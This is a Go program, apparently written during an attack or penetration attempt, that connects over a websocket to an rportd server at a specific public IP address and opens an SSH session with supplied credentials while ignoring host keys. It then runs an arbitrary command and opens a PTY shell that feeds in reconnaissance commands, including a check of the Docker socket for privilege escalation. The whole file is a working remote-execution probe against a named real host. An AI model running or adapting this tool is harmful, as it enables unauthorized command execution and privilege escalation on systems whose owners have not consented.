package main

// Test whether the aro-ops rportd (43.134.173.45:20801) session channel grants
// command execution as uid996 (aro_client). Mirrors rpfwd.go transport, but
// instead of tcpip forwarding it opens a "session" channel and tries exec/shell.

import (
	"bytes"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

const PV = "rport-v1"

type wsConn struct {
	*websocket.Conn
	buff []byte
}

func newWSConn(c *websocket.Conn) net.Conn { return &wsConn{Conn: c} }
func (c *wsConn) Read(dst []byte) (int, error) {
	ldst := len(dst)
	var src []byte
	if len(c.buff) > 0 {
		src = c.buff
		c.buff = nil
	} else if _, msg, err := c.Conn.ReadMessage(); err == nil {
		src = msg
	} else {
		return 0, err
	}
	if len(src) > ldst {
		n := copy(dst, src[:ldst])
		r := src[ldst:]
		c.buff = make([]byte, len(r))
		copy(c.buff, r)
		return n, nil
	}
	return copy(dst, src), nil
}
func (c *wsConn) Write(b []byte) (int, error) {
	if err := c.Conn.WriteMessage(websocket.BinaryMessage, b); err != nil {
		return 0, err
	}
	return len(b), nil
}
func (c *wsConn) SetDeadline(t time.Time) error {
	c.Conn.SetReadDeadline(t)
	return c.Conn.SetWriteDeadline(t)
}

func main() {
	time.AfterFunc(60*time.Second, func() { fmt.Println("WATCHDOG_TIMEOUT"); os.Exit(0) })
	addr, user, pass, cmd := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
	u, _ := url.Parse("ws://" + addr + "/")
	hdr := map[string][]string{"User-Agent": {"rport 0.9.14"}}
	d := &websocket.Dialer{ReadBufferSize: 1024, WriteBufferSize: 1024, HandshakeTimeout: 30 * time.Second, Subprotocols: []string{PV}}
	ws, resp, err := d.Dial(u.String(), hdr)
	if err != nil {
		if resp != nil {
			fmt.Println("WSDIAL_ERR", err, resp.Status)
		} else {
			fmt.Println("WSDIAL_ERR", err)
		}
		return
	}
	defer ws.Close()
	conn := newWSConn(ws)
	cfg := &ssh.ClientConfig{User: user, Auth: []ssh.AuthMethod{ssh.Password(pass)}, ClientVersion: "SSH-" + PV + "-client", HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: 20 * time.Second}
	cc, chans, reqs, err := ssh.NewClientConn(conn, "", cfg)
	if err != nil {
		fmt.Println("SSH_ERR", err)
		return
	}
	client := ssh.NewClient(cc, chans, reqs)
	defer client.Close()

	// Mode A: exec request
	s, err := client.NewSession()
	if err != nil {
		fmt.Println("EXEC_NEWSESSION_ERR", err)
	} else {
		var out, ser bytes.Buffer
		s.Stdout = &out
		s.Stderr = &ser
		err = s.Run(cmd)
		fmt.Println("EXEC_RC", err)
		fmt.Println("EXEC_STDOUT<<<" + out.String() + ">>>")
		fmt.Println("EXEC_STDERR<<<" + ser.String() + ">>>")
		s.Close()
	}

	// Mode B: pty + shell
	s2, err := client.NewSession()
	if err != nil {
		fmt.Println("SHELL_NEWSESSION_ERR", err)
		return
	}
	defer s2.Close()
	var o2 bytes.Buffer
	s2.Stdin = strings.NewReader("id; echo W_MARK; groups; echo ---; ls -l /var/run/docker.sock; echo ---; exit\nexit\n")
	s2.Stdout = &o2
	s2.Stderr = &o2
	_ = s2.RequestPty("xterm", 40, 120, ssh.TerminalModes{})
	if err := s2.Shell(); err != nil {
		fmt.Println("SHELL_ERR", err)
	} else {
		done := make(chan struct{})
		go func() { s2.Wait(); close(done) }()
		select {
		case <-done:
		case <-time.After(20 * time.Second):
		}
	}
	fmt.Println("SHELL_OUT<<<" + o2.String() + ">>>")
}
